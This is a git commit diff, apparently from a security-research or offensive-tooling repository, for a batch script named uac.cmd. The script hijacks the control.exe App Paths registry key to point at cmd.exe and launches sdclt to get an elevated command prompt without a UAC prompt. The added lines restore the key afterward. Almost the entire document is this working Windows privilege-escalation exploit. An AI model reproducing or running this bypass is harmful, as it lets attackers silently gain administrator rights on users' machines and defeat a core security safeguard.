383386e2c7715352a8d3f7cf174caa9d253c1b35
Aaron Lewis <the.warl0ck.1989@gmail.com>
2017-03-16 10:47:24 +0800

    Let us release that way

--- uac.cmd
+++ uac.cmd
@@ -2,3 +2,5 @@
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
 sdclt
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d "c:\windows\system32\control.exe" /f
+
